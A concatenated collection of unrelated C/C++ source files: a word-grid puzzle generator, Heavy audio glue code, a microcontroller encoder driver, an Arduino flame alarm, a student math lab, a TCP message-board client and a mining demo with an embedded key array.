0; tries < 1000 && !placed; tries++)\r\n        {\r\n            int row = rand() % GRID_SIZE;\r\n            int col = rand() % GRID_SIZE;\r\n            bool isHorizontal = rand() % 2 == 0; // \u968f\u673a\u9009\u62e9\u6a2a\u5411\u6216\u7eb5\u5411\r\n\r\n            if (isValidPlacement(word, row, col, isHorizontal))\r\n            {\r\n                string color = colors[colorIndex];\r\n                colorIndex = (colorIndex + 1) % colors.size();\r\n\r\n                wordColors[word] = color; // \u5b58\u50a8\u5355\u8bcd\u7684\u989c\u8272\r\n\r\n                // \u5c06\u5355\u8bcd\u586b\u5165\u7f51\u683c\r\n                for (size_t i = 0; i < word.length(); i++)\r\n                {\r\n                    if (isHorizontal)\r\n                    {\r\n                        AnswerGrid[row][col + i] = word[i];\r\n                        colorGrid[row][col + i] = color;\r\n                    }\r\n                    else\r\n                    {\r\n                        AnswerGrid[row + i][col] = word[i];\r\n                        colorGrid[row + i][col] = color;\r\n                    }\r\n                }\r\n                placed = true;\r\n            }\r\n        }\r\n    }\r\n\r\n    // \u968f\u673a\u586b\u516510\u4e2a\u65e0\u5173\u7684\u5b57\u6bcd\r\n    for (int i = 0; i < 10; i++)\r\n    {\r\n        int row, col;\r\n        do\r\n        {\r\n            row = rand() % GRID_SIZE;\r\n            col = rand() % GRID_SIZE;\r\n        } while (colorGrid[row][col] != \"white\"); // \u5982\u679c\u8fd9\u4e2a\u4f4d\u7f6e\u5df2\u7ecf\u88ab\u5355\u8bcd\u5360\u7528\uff0c\u5c31\u91cd\u65b0\u9009\u62e9\u4f4d\u7f6e\r\n\r\n        char letter = 'a' + rand() % 26; // \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u5c0f\u5199\u5b57\u6bcd\r\n        AnswerGrid[row][col] = letter;\r\n    }\r\n}\r\n\r\n// \u521d\u59cb\u5316\u73a9\u5bb6\u7f51\u683c\r\nvoid initPlayerGrid()\r\n{\r\n    // \u521b\u5efa\u4e00\u4e2a\u968f\u673a\u6570\u751f\u6210\u5668\r\n    std::default_random_engine generator;\r\n\r\n    for (int i = 0; i < GRID_SIZE; i++)\r\n    {\r\n        for (int j = 0; j < GRID_SIZE; j++)\r\n        {\r\n            PlayerGrid[i][j] = ' ';\r\n            PlayerColorGrid[i][j] = \"\";\r\n        }\r\n    }\r\n\r\n    // \u6536\u96c6\u6240\u6709\u5355\u8bcd\u7684\u5b57\u6bcd\r\n    map<string, vector<pair<int, int>>> wordCells;\r\n    for (const auto &word : currentWords)\r\n    {\r\n        string color = wordColors[word]; // \u83b7\u53d6\u5355\u8bcd\u7684\u989c\u8272\r\n        for (int i = 0; i < GRID_SIZE; i++)\r\n        {\r\n            for (int j = 0; j < GRID_SIZE; j++)\r\n            {\r\n                if (AnswerGrid[i][j] != ' ' && colorGrid[i][j] == color)\r\n                {\r\n                    wordCells[word].push_back({i, j});\r\n                }\r\n            }\r\n        }\r\n    }\r\n\r\n    // \u4e3a\u6bcf\u4e2a\u5355\u8bcd\u9009\u62e9\u4e24\u4e2a\u5b57\u6bcd\u663e\u793a\u5728\u73a9\u5bb6\u7f51\u683c\u4e2d\r\n    for (const auto &word : currentWords)\r\n    {\r\n        shuffle(wordCells[word].begin(), wordCells[word].end(), generator);\r\n        for (int i = 0; i < min(2, (int)wordCells[word].size()); i",
    "/**\r\n * Copyright (c) 2024 Enzien Audio, Ltd.\r\n * \r\n * Redistribution and use in source and binary forms, with or without modification,\r\n * are permitted provided that the following conditions are met:\r\n * \r\n * 1. Redistributions of source code must retain the above copyright notice,\r\n *    this list of conditions, and the following disclaimer.\r\n * \r\n * 2. Redistributions in binary form must reproduce the phrase \"powered by heavy\",\r\n *    the heavy logo, and a hyperlink to https://enzienaudio.com, all in a visible\r\n *    form.\r\n * \r\n *   2.1 If the Application is distributed in a store system (for example,\r\n *       the Apple \"App Store\" or \"Google Play\"), the phrase \"powered by heavy\"\r\n *       shall be included in the app description or the copyright text as well as\r\n *       the in the app itself. The heavy logo will shall be visible in the app\r\n *       itself as well.\r\n * \r\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\r\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\r\n * THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\r\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\r\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\r\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\r\n * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\r\n * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\r\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\r\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n * \r\n */\r\n\r\n#include \"Heavy_prog.hpp\"\r\n\r\n#include <new>\r\n\r\n#define Context(_c) static_cast<Heavy_prog *>(_c)\r\n\r\n\r\n/*\r\n * C Functions\r\n */\r\n\r\nextern \"C\" {\r\n  HV_EXPORT HeavyContextInterface *hv_prog_new(double sampleRate) {\r\n    // allocate aligned memory\r\n    void *ptr = hv_malloc(sizeof(Heavy_prog));\r\n    // ensure non-null\r\n    if (!ptr) return nullptr;\r\n    // call constructor\r\n    new(ptr) Heavy_prog(sampleRate);\r\n    return Context(ptr);\r\n  }\r\n\r\n  HV_EXPORT HeavyContextInterface *hv_prog_new_with_options(double sampleRate,\r\n      int poolKb, int inQueueKb, int outQueueKb) {\r\n    // allocate aligned memory\r\n    void *ptr = hv_malloc(sizeof(Heavy_prog));\r\n    // ensure non-null\r\n    if (!ptr) return nullptr;\r\n    // call constructor\r\n    new(ptr) Heavy_prog(sampleRate, poolKb, inQueueKb, outQueueKb);\r\n    return Context(ptr);\r\n  }\r\n\r\n  HV_EXPORT void hv_prog_free(HeavyContextInterface *instance) {\r\n    // call destructor\r\n    Context(instance)->~Heavy_prog();\r\n    // free memory\r\n    hv_free(instance);\r\n  }\r\n} // extern \"C\"\r\n\r\n\r\n\r\n/*\r\n * Table Data\r\n */\r\n\r\nfloat hTable_RPybrwyL_data[256] = {0.1f, 0.206667f, 0.233333f, 0.24f, 0.266667f, 0.306666f, 0.32f, 0.333333f, 0.35f, 0.353333f, 0.383333f, 0.388333f, 0.393333f, 0.423333f, 0.443333f, 0.45f, 0.473333f, 0.478333f, 0.496666f, 0.506666f, 0.51f, 0.54f, 0.556666f, 0.566666f, 0.573333f, 0.59f, 0.6f, 0.623333f, 0.63f, 0.573333f, 0.586667f, 0.592222f, 0.597778f, 0.603333f, 0.608889f, 0.614444f, 0.62f, 0.624444f, 0.628889f, 0.633333f, 0.641111f, 0.648889f, 0.656667f, 0.661667f, 0.666667f, 0.68f, 0.681667f, 0.686667f, 0.686667f, 0.68f, 0.672222f, 0.664444f, 0.656667f, 0.645555f, 0.634444f, 0.623333f, 0.611111f, 0.598889f, 0.586667f, 0.55f, 0.513333f, 0.46f, 0.45f, 0.433333f, 0.423333f, 0.403333f, 0.396667f, 0.39f, 0.383334f, 0.371667f, 0.36f, 0.35f, 0.343334f, 0.336667f, 0.333334f, 0.326667f, 0.326667f, 0.332222f, 0.337778f, 0.343334f, 0.35f, 0.356667f, 0.363334f, 0.37f, 0.385f, 0.4f, 0.412222f, 0.424445f, 0.436667f, 0.476667f, 0.526667f, 0.546667f, 0.61f, 0.583333f, 0.551667f, 0.52f, 0.493333f, 0.466667f, 0.44f, 0.418889f, 0.397778f, 0.376667f, 0.3625f, 0.348334f, 0.334167f, 0.32f, 0.301667f, 0.283334f, 0.277778f, 0.272222f, 0.266667f, 0.26f, 0.26f, 0.26f, 0.26f, 0.26f, 0.26f, 0.26f, 0.26f, 0.26f, 0.26f, 0.263334f, 0.266667f, 0.27f, 0.273334f, 0.276667f, 0.28f, 0.286667f, 0.293334f, 0.3f, 0.306667f, 0.313334f, 0.321111f, 0.328889f, 0.336667f, 0.344445f, 0.352222f, 0.36f, 0.375333f, 0.390667f, 0.406f, 0.421333f, 0.436667f, 0.449583f, 0.4625f, 0.475417f, 0.488333f, 0.50125f, 0.514167f, 0.527083f, 0.54f, 0.562f, 0.584f, 0.606f, 0.628f, 0.65f, 0.665833f, 0.681667f, 0.6975f, 0.713333f, 0.736667f, 0.76f, 0.78f, 0.791666f, 0.796666f, 0.775f, 0.753333f, 0.69f, 0.646667f, 0.603333f, 0.565f, 0.526667f, 0.48f, 0.466667f, 0.453333f, 0.445f, 0.436667f, 0.433333f, 0.433333f, 0.433333f, 0.433333f, 0.435333f, 0.437333f, 0.439333f, 0.441333f, 0.443334f, 0.447667f, 0.452f, 0.456334f, 0.460667f, 0.465f, 0.469333f, 0.473667f, 0.478f, 0.482333f, 0.486667f, 0.495f, 0.503333f, 0.511667f, 0.52f, 0.528333f, 0.536667f, 0.545f, 0.553333f, 0.561667f, 0.57f, 0.58f, 0.59f, 0.6f, 0.61f, 0.62f, 0.63f, 0.64f, 0.65f, 0.662083f, 0.674167f, 0.68625f, 0.698333f, 0.710417f, 0.7225f, 0.734583f, 0.746667f, 0.757619f, 0.768571f, 0.779524f, 0.79047",
    "/*\n * Encoder.cpp\n * Created on: 2022 10/3\n * Author: Mishima\n */\n\n#include \"Encoder.hpp\"\n\nEncoder::Encoder()\n{\n    _total_cnt = 0;\n    _cnt = 0;\n    _cnt1 = 0;\n    _a = 0.5;\n    _filter_cnt = 0;\n    for (int i = 0; i < Filter_N; i++)\n    {\n        _filter_value[i] = 0;\n    }\n}\n\n//------------------------------------------------------------------//\n// Initialize MTU2 Phase Count functions\n//------------------------------------------------------------------//\n// MTU2_1\n// Phase counting mode 2\n// TCLKA(P1_0)  :Enconder A\n// TCLKB(P1_10) :Enconder B\n//------------------------------------------------------------------//\nvoid Encoder::init(void)\n{\n    CPGSTBCR3 &= ~0x08;\n\n    GPIOPIBC1 &= ~0x0401;\n    GPIOPBDC1 &= ~0x0401;\n    GPIOPM1 |= 0x0401;\n    GPIOPMC1 &= ~0x0401;\n    GPIOPIPC1 &= ~0x0401;\n\n    GPIOPBDC1 &= ~0x0401;\n\n    GPIOPFC1 |= 0x0400;\n    GPIOPFCE1 |= 0x0401;\n\n    GPIOPIPC1 |= 0x0401;\n    GPIOPMC1 |= 0x0401;\n\n    MTU2TSTR &= ~0x02; // \u30ab\u30a6\u30f3\u30bf\u30b9\u30c8\u30c3\u30d7\n    MTU2TCR_1 = 0x14;  // \u4e0a\u3000\u4e21\u30a8\u30c3\u30b8\u3000\u4e0b\u3000\u5916\u90e8\u30ab\u30a6\u30f3\u30bf\n\n    MTU2TMDR_1 |= 0x00; // \u4f4d\u76f8\u8a08\u6570\u30e2\u30fc\u30c92 https://www.renesas.com/jp/ja/document/mah/rza1h-group-rza1m-group-users-manual-hardware 463\u30da\u30fc\u30b8\n                        // MTU2TMDR_3|=0x00;//\u901a\u5e38\u30e2\u30fc\u30c9\n    MTU2TCNT_1 = 0x00;  // 32767\n    MTU2TIOR_1 |= 0x0A; // \u4e21\u30a8\u30c3\u30b8\u8a2d\u5b9a\n    MTU2TSTR |= 0x02;   // \u30bf\u30a4\u30de\u30fc\u30b9\u30bf\u30fc\u30c8\n\n    // MTU2TCR_3=0x10;//1x\uff1a\u4e21\u30a8\u30c3\u30b8\u3067\u30ab\u30a6\u30f3\u30c8\n    // MTU2TIORH_3 |= 0xAA;//\u4e21\u65b9\u30ab\u30a6\u30f3\u30c8\u8a2d\u5b9a\n    // MTU2TCNT_3 = 0x7FFF;//\u305c\u308d\u304f\u308a\uff1f\uff1f\n}\n\n// \u30ab\u30a6\u30f3\u30c8\u66f4\u65b0\nvoid Encoder::update(void)\n{\n    float sum = 0;\n    // _cnt = 0 - (MTU2TCNT_1 - 32767);\n    // MTU2TCNT_1 = 0x7FFF;\n    // _cnt =MTU2TCNT_1;\n    //  MTU2TCNT_1 = 0x00;\n\n    _cnt = MTU2TCNT_1;\n    MTU2TCNT_1 = 0x0000;\n    _cnt_kyorikousinnmae = 0;\n    _total_cnt = _total_cnt + _cnt;\n    _cntmaga = _cntmaga + _cnt;\n\n    _course_cnt = _course_cnt + _cnt;\n\n    _cnt1 = _cnt1 + _cnt;\n    _rc = _a * _rc + (1 - _a) * (float)_cnt;\n\n    _filter_value[_filter_cnt] = _cnt;\n    _filter_cnt++;\n    if (_filter_cnt > Filter_N)\n    {\n        _filter_cnt = 0;\n    }\n    for (int i = 0; i < Filter_N; i++)\n    {\n        sum += _filter_value[i];\n    }\n    _avg = sum / Filter_N;\n\n    cntdata[3] = cntdata[2];\n    cntdata[2] = cntdata[1];\n    cntdata[1] = cntdata[0];\n    cntdata[0] = _cnt;\n    cntgoukei = cntdata[0] + cntdata[1] + cntdata[2] + cntdata[3];\n    cntave = cntgoukei / 4;\n}\n\nvoid Encoder::kyoriupdate()\n{\n    // _cnt_kyorikousinn=MTU2TCNT_1-_cnt_kyorikousinnmae;\n    // _total_cnt = _total_cnt + _cnt_kyorikousinn;\n    // _cntclank = _cntclank + _cnt_kyorikousinn;\n    // _cnt_kyorikousinnmae=_cnt_kyorikousinn;\n}\n\n// \u5168\u30ab\u30a6\u30f3\u30c8\u30af\u30ea\u30a2\nvoid Encoder::clear(void)\n{\n    _total_cnt = 0;\n\n    //_cntclank = 0;\n    // _cnt = 0;\n    // _cnt1 = 0;\n    // MTU2TCNT_3 = 0x00;\n}\n\n// void Encoder::clearkura(void)\n// {\n//     //_total_cnt = 0;\n\n//     _cntclank = 0;\n//     // _cnt = 0;\n//     // _cnt1 = 0;\n//     // MTU2TCNT_3 = 0x00;\n// }\n\nvoid Encoder::setvalue(int value)\n{\n    _total_cnt = value;\n    // _cnt = 0;\n    // _cnt1 = 0;\n    // MTU2TCNT_3 = 0x00;\n}\n\nvoid Encoder::setmaga(int value)\n{\n    _cntmaga = value;\n    // _cnt = 0;\n    // _cnt1 = 0;\n    // MTU2TCNT_3 = 0x00;\n}\n\n// \u30c8\u30fc\u30bf\u30eb\u30ab\u30a6\u30f3\u30c8\u53d6\u5f97\nint Encoder::getTotalCount(void)\n{\n    return _total_cnt;\n}\n\nint Encoder::getCourseCount(void)\n{\n    return _course_cnt;\n}\n\n// 10ms\u9593\u306e\u30ab\u30a6\u30f3\u30c8\u3092\u53d6\u5f97\nint Encoder::getCnt(void)\n{\n    // return _cnt;\n    return cntave;\n}\n\nint Encoder::getMagaCount(void)\n{\n    return _cntmaga;\n}\n// \u30d5\u30a3\u30eb\u30bf\u30fc\u3092\u901a\u3057\u305f\u5024\u3092\u53d6\u5f97\nfloat Encoder::getFilteredCnt(void)\n{\n    return _avg;\n}\n",
    "//Including all libraries\n// include the library code\n#include <LiquidCrystal.h>\n//include serial library\n#include <SoftwareSerial.h>\n\n//Declaring variables\nint fl;//Input Variable\nint buz=13;//Pin for buzzer\nint led=13;//Pin for LED\nint flag;// status\n\n// initialize the library with the numbers of the interface pins\nLiquidCrystal lcd(12, 11, 5, 4, 3, 2);\n\nvoid setup() {\n  // set up the LCD's number of columns and rows:\n  lcd.begin(16, 2);\n  pinMode(fl,INPUT);//Declaring flame sensor\npinMode(buz,OUTPUT);//Declaring buzzer\npinMode(led,OUTPUT);//Declaring LED \nSerial.begin(9600);//Initialising serial port\n  \n}\n\nvoid loop() {\n  // set the cursor to column 0, line 1\n  // (note: line 1 is the second row, since counting begins with 0):\n  lcd.setCursor(4, 0);\n  lcd.print(\"IoT-Spot\");\n  flag= digitalRead(fl);\n  if(Serial.available()){//Taking Serial Input\n    flag = Serial.read();//Reading Input\n    Serial.write(flag);//Displaying input in Serial Port\n    Serial.println(\"\\n\");\n  }\nif( flag==1)\n{\n  tone(buz, 1000, 1000);//Keeping buzzer on with frequency 1000Hz\n  digitalWrite(led,HIGH);//Switching on LED\n  lcd.setCursor(6,1);//LCD Display\n  lcd.print(\"FIRE!\");\n  Serial.println(\"Alert! Flame detected\");\n  delay(2000);\n  lcd.setCursor(2,1);\n  lcd.print(\"         \");\n}\n  //For input 1 status of fire on\n  if(flag!=1)\n{\n  digitalWrite(buz,LOW);//Keeping buzzer off\n  digitalWrite(led,LOW);//Keeping LED on\n  Serial.println(\"No-Flame detected\");\n  lcd.setCursor(4,1);\n  lcd.print(\"N0-FIRE!\");\n  delay(2000);\n  lcd.setCursor(2,1);\n  lcd.print(\"         \");\n\n  } \n}\n ",
    "// Lab_03_3.cpp\n// \u00d1\u00f2\u00f0\u00ee\u00e3\u00e0\u00ed \u00c0\u00ed\u00e0\u00f1\u00f2\u00e0\u00f1\u00b3\u00ff\n// \u00cb\u00e0\u00e1\u00ee\u00f0\u00e0\u00f2\u00ee\u00f0\u00ed\u00e0 \u00f0\u00ee\u00e1\u00ee\u00f2\u00e0 \u00b9 3.3\n// \u00d0\u00ee\u00e7\u00e3\u00e0\u00eb\u00f3\u00e6\u00e5\u00ed\u00ed\u00ff, \u00e7\u00e0\u00e4\u00e0\u00ed\u00e5 \u00e3\u00f0\u00e0\u00f4\u00b3\u00ea\u00ee\u00ec \u00f4\u00f3\u00ed\u00ea\u00f6\u00b3\u00bf.\n// \u00c2\u00e0\u00f0\u00b3\u00e0\u00ed\u00f2 16\n#include <iostream>\n#include <cmath>\n\nusing namespace std;\n\nint main()\n{\n    double x; // \u00e2\u00f5\u00b3\u00e4\u00ed\u00e8\u00e9 \u00e0\u00f0\u00e3\u00f3\u00ec\u00e5\u00ed\u00f2\n    double R1, R2; // \u00e2\u00f5\u00b3\u00e4\u00ed\u00b3 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00e8\n    double y; // \u00f0\u00e5\u00e7\u00f3\u00eb\u00fc\u00f2\u00e0\u00f2 \u00ee\u00e1\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00ff \u00e2\u00e8\u00f0\u00e0\u00e7\u00f3\n\n    cout << \"R1 = \"; cin >> R1;\n    cout << \"R2 = \"; cin >> R2;\n    cout << \"x = \"; cin >> x;\n\n    // \u00f0\u00ee\u00e7\u00e3\u00e0\u00eb\u00f3\u00e6\u00e5\u00ed\u00ed\u00ff \u00e2 \u00ef\u00ee\u00e2\u00ed\u00b3\u00e9 \u00f4\u00ee\u00f0\u00ec\u00b3\n    if (x <= -2) {\n        y = -R1;\n    }\n    else \n        if (x > -2 && x <= 0) {\n        y = (-R1 / 2) * x - R1;\n    }\n       else\n            if (x > 0 && x <= 1) {\n        y = R1 - sqrt(R1 * R1 - x * x);\n    }\n            else\n                if (x > 1 && x <= 4) {\n        y = sqrt(R2 * R2 - (x - R2) * (x - R2));\n    }\n               else\n                    if (x > 4 && x <= 6) {\n        y = (x - 4) * (R2 / 2);\n    }\n    else {\n        y = 0; // \u00c4\u00eb\u00ff \u00e2\u00e8\u00ef\u00e0\u00e4\u00ea\u00b3\u00e2, \u00ea\u00ee\u00eb\u00e8 x \u00ef\u00ee\u00e7\u00e0 \u00e2\u00e8\u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ec \u00e4\u00b3\u00e0\u00ef\u00e0\u00e7\u00ee\u00ed\u00ee\u00ec\n    }\n\n    cout << endl;\n    cout << \"y = \" << y << endl;\n\n    cin.get();\n    return 0;\n}",
    "/* @Author shigw    @Email sicrve@gmail.com */\r\n\r\n#include \"TreeHoleClient.h\"\r\n#include <string>\r\n\r\n\r\n// \u8bbe\u7f6e\u5957\u63a5\u5b57\u4e3a\u975e\u963b\u585e\r\nint TreeHoleClient::setSocketNonBlocking1(int fd) {\r\n    int flag = fcntl(fd, F_GETFL, 0);\r\n    if (flag == -1) return -1;\r\n\r\n    flag |= O_NONBLOCK;\r\n    if (fcntl(fd, F_SETFL, flag) == -1) return -1;\r\n    return 0;\r\n}\r\n\r\nTreeHoleClient::TreeHoleClient(const string& ip, int port, const string& user)\r\n   :servIP_(ip), servPort_(port), username_(user) {\r\n\r\n    // \u6e05\u7a7a\u7f13\u5b58\r\n    memset(buff_, 0, sizeof(buff_)/sizeof(char));\r\n\r\n    // \u8fde\u63a5\u8fdc\u7a0b\u670d\u52a1\u5668\r\n    struct sockaddr_in servaddr;\r\n    memset(&servaddr, 0, sizeof(servaddr));\r\n    servaddr.sin_family = AF_INET;\r\n    servaddr.sin_port = htons(servPort_);\r\n    const char* servIP_in = servIP_.c_str();\r\n    inet_pton(AF_INET, servIP_in, &servaddr.sin_addr);\r\n\r\n    // \u53d1\"GET  HTTP/1.1\"\r\n    sockfd_ = socket(PF_INET, SOCK_STREAM, 0);\r\n    if (connect(sockfd_, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1) {\r\n        perror(\"err2\");\r\n    }\r\n    setSocketNonBlocking1(sockfd_);\r\n    \r\n    cout << \" ***** \u670d\u52a1\u5668\u8fde\u63a5\u6210\u529f\uff01\u6b22\u8fce \" << username_ << \" \u7684\u8bbf\u95ee\uff01 ***** \" << endl;\r\n\r\n    // \u53d1\u9001hello\uff0c\u83b7\u53d6index.html\r\n    string p = \"GET / HTTP/1.1\\r\\nHost: \" + servIP_ + \":\" + to_string(servPort_) + \"\\r\\nContent-Type: \"\r\n                \"application/x-www-form-urlencoded\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\r\n\r\n    const char* p_in = p.c_str();\r\n    ssize_t n = write(sockfd_, p_in, strlen(p_in));\r\n    sleep(1);\r\n    n = read(sockfd_, buff_, 4096);\r\n    buff_[n] = 0;\r\n    printf(\"\\n%s\", buff_);\r\n\r\n    memset(buff_, 0, sizeof(buff_)/sizeof(char));\r\n}\r\n\r\n\r\nTreeHoleClient::~TreeHoleClient() { \r\n    if(sockfd_ != -1) {\r\n        close(sockfd_);\r\n        sockfd_ = -1;\r\n        cout << \"\u8fde\u63a5\u5df2\u5173\u95ed~\" << endl;\r\n    }\r\n}\r\n\r\n\r\nvoid TreeHoleClient::loop() {\r\n\r\n    cout << \"\\n\\n\\t\\t --- \u8fd9\u91cc\u662fSicrve\u7684\u6811\u6d1e, \u4f60\u53ef\u4ee5: --- \" << endl;\r\n    cout << \"\\t 1. \u7559\u8a00\" << endl;\r\n    cout << \"\\t 2. \u83b7\u53d6\u6700\u65b0\u7559\u8a00\" << endl;\r\n    cout << \"\\t \u8bf7\u9009\u62e9(q/Q \u9000\u51fa):\";\r\n\r\n    while(1) {\r\n        string input;\r\n        cin >> input;\r\n\r\n        if(input.size() != 0) {\r\n            if(input[0] == 'q' || input[0] == 'Q') {\r\n                cout << endl << \"\u6b22\u8fce\u4e0b\u6b21\u518d\u6765~\" << endl;\r\n                break;\r\n            } else if(input[0] == '1') {\r\n                string msg;\r\n                cout << endl << \"\u8bf7\u8f93\u5165\uff1a\";\r\n                cin.ignore();\r\n                getline(cin, msg);      // \u5141\u8bb8\u6709\u7a7a\u683c\r\n\r\n                string p = \"POST /msg HTTP/1.1\\r\\nHost: \" + servIP_ + \":\" + to_string(servPort_) + \"\\r\\nContent-Type: \"\r\n                    \"application/x-www-form-urlencoded\\r\\nConnection: Keep-Alive\\r\\n\\r\\n^\" + username_ + \"@\" + msg + \"^\";\r\n\r\n                const char* p_in = p.c_str();\r\n                ssize_t n = write(sockfd_, p_in, strlen(p_in));\r\n                sleep(1);\r\n                n = read(sockfd_, buff_, 4096);\r\n                if(n <= 0) {\r\n                    cout << \"\u670d\u52a1\u5668\u5df2\u4e2d\u65ad\uff01\u7559\u8a00\u5931\u8d25\uff0c\u8bf7\u7a0d\u540e\u518d\u8bd5\uff01\" << endl;\r\n                    break;\r\n                }\r\n\r\n                buff_[n] = 0;\r\n                printf(\"\\n%s\\n\", buff_);\r\n                memset(buff_, 0, sizeof(buff_)/sizeof(char));\r\n                \r\n                cout << \"\\n\\t\\t --- \u8fd9\u91cc\u662fSicrve\u7684\u6811\u6d1e, \u4f60\u53ef\u4ee5: --- \" << endl;\r\n                cout << \"\\t 1. \u7559\u8a00\" << endl;\r\n                cout << \"\\t 2. \u83b7\u53d6\u6700\u65b0\u7559\u8a00\" << endl;\r\n                cout << \"\\t \u8bf7\u9009\u62e9(q/Q \u9000\u51fa):\";\r\n                continue;\r\n\r\n            } else if(input[0] == '2') {\r\n                int cnt = 1;\r\n                unsigned long key = 0;\r\n\r\n                string year, month, day;\r\n                cout << endl << \"\u8bf7\u8f93\u5165\u83b7\u53d6\u7559\u8a00\u7684\u6570\u91cf\uff1a(\u6700\u592720\u6761)\";\r\n                cin >> cnt;\r\n                cnt = max(min(20, cnt), 0);\r\n                \r\n                cout << endl << \"\u662f\u5426\u6307\u5b9a\u8d77\u59cb\u65e5\u671f[y]/[n]\uff1a\";\r\n                char isdate;\r\n                cin >> isdate;\r\n                if(isdate == 'y' || isdate == 'Y') {\r\n                    cout << endl << \"\u8bf7\u5206\u522b\u8f93\u5165\u5e74\u6708\u65e5\uff08\u4f7f\u7528\u7a7a\u683c\u6216\u6362\u884c\u95f4\u9694\uff09\uff1a\";\r\n                    cin >> year >> month >> day;\r\n                    \r\n                    int nyear = stoi(year);\r\n                    int nmonth = stoi(month);\r\n                    int nday = stoi(day);\r\n                    nyear = max(nyear, 1970);\r\n                    nmonth = min(max(nmonth, 1), 12);\r\n                    nday = min(max(nday, 1), 31);\r\n\r\n                    struct tm ntime;\r\n                    ntime.tm_year = nyear - 1900;\r\n                    ntime.tm_mon = nmonth - 1;\r\n                    ntime.tm_mday = nday;\r\n\r\n                    key = static_cast<unsigned long>(mktime(&ntime));\r\n                }\r\n\r\n                string p = \"GET /^\" + to_string(key) + \"@\" + to_string(cnt) + \"^ HTTP/1.1\\r\\nHost: \" + servIP_ + \":\" + to_string(servPort_) + \"\\r\\nContent-Type: \"\r\n                    \"application/x-www-form-urlencoded\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\r\n\r\n                const char* p_in = p.c_str();\r\n                ssize_t n = write(sockfd_, p_in, strlen(p_in));\r\n                sleep(1);\r\n                n = read(sockfd_, buff_, 4096);\r\n                if(n == 0) {\r\n               ",
    "// Copyright (c) 2024 Marco Fortina\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or https://www.opensource.org/licenses/mit-license.php.\n\n// Include Qyra library\n#include <qyra.h>\n\n#include <iostream>\n#include <stdint.h>\n#include <string>\n#include <vector>\n\n/**\n * @brief Main function that initializes a CQYRA object, sets the header and nonce,\n * mines for a solution, and then prints the solution and its validity.\n *\n * The main function does the following steps:\n * - Initializes a CQYRA object.\n * - Sets the block header and nonce to specific values.\n * - Calls the mining process to generate a solution.\n * - Retrieves and prints the solution as a string.\n * - Outputs the size of the solution.\n * - Verifies if the generated solution is valid and prints the result.\n *\n * @note The public key is defined as an array of 1184 bytes and is used for encryption\n *       or verification purposes within the CQYRA algorithm. The secret key is defined\n *       as an array of 2400 bytes and is used for decryption or signing.\n *\n * @return int Program exit status.\n */\nint main()\n{\n    // Public key.\n    uint8_t public_key[1184] =\n        {\n            0x89, 0xec, 0x16, 0x38, 0xd4, 0x1b, 0xe0, 0x10,\n            0x3e, 0x9d, 0xa3, 0x4e, 0x53, 0x82, 0xc7, 0xa0,\n            0xf2, 0x61, 0x12, 0x0a, 0x14, 0xdb, 0x74, 0x9d,\n            0x33, 0x01, 0x7f, 0xc9, 0x19, 0x59, 0x12, 0x6a,\n            0x33, 0x40, 0x3b, 0x7a, 0xc0, 0xea, 0x10, 0xf8,\n            0xc3, 0xb3, 0xef, 0x50, 0x5c, 0xa5, 0x81, 0x1f,\n            0x36, 0x65, 0xc7, 0x14, 0x98, 0x28, 0x56, 0xcb,\n            0xba, 0x0d, 0xe8, 0xaa, 0xf3, 0x90, 0x03, 0x1c,\n            0xd3, 0xb0, 0x32, 0x40, 0x52, 0xeb, 0xf7, 0x50,\n            0xa4, 0x3b, 0x0e, 0x5b, 0x4b, 0x41, 0x66, 0x0b,\n            0xba, 0x05, 0xc1, 0x95, 0x21, 0x9b, 0x13, 0x61,\n            0x7c, 0x1b, 0xa2, 0x43, 0xc1, 0xad, 0x5b, 0x18,\n            0x1a, 0x58, 0x71, 0x48, 0x18, 0x8a, 0x07, 0x31,\n            0x78, 0x49, 0x92, 0xac, 0xf3, 0x5b, 0xa1, 0x6c,\n            0xeb, 0x50, 0x76, 0x92, 0x3a, 0x3a, 0x91, 0xa7,\n            0x8f, 0x31, 0x85, 0xcb, 0x5c, 0x22, 0x97, 0x69,\n            0xae, 0x5f, 0x6c, 0xa1, 0xbc, 0x42, 0x5e, 0x89,\n            0xba, 0x69, 0x29, 0xf7, 0x18, 0xd9, 0x28, 0x03,\n            0x05, 0xe6, 0x42, 0xbf, 0x68, 0x92, 0xc4, 0x09,\n            0x3a, 0x3e, 0x3c, 0x39, 0xd4, 0x61, 0xc8, 0x95,\n            0x45, 0xcf, 0x47, 0x81, 0x10, 0x32, 0xa3, 0xbb,\n            0xef, 0xf2, 0x46, 0xae, 0x7c, 0x9a, 0x9a, 0x10,\n            0x5f, 0x67, 0xa0, 0x9a, 0xe4, 0x0a, 0x3f, 0x0f,\n            0x10, 0x42, 0x32, 0x57, 0xae, 0xdf, 0x6a, 0x13,\n            0xca, 0x1b, 0xcb, 0x44, 0x31, 0x6e, 0x2a, 0x3b,\n            0xc6, 0x0e, 0x5c, 0x44, 0xf8, 0x59, 0x56, 0xe9,\n            0x1c, 0x72, 0x21, 0xa5, 0x7d, 0x87, 0x35, 0x04,\n            0x46, 0x68, 0x20, 0x39, 0x36, 0xcc, 0xfa, 0x28,\n            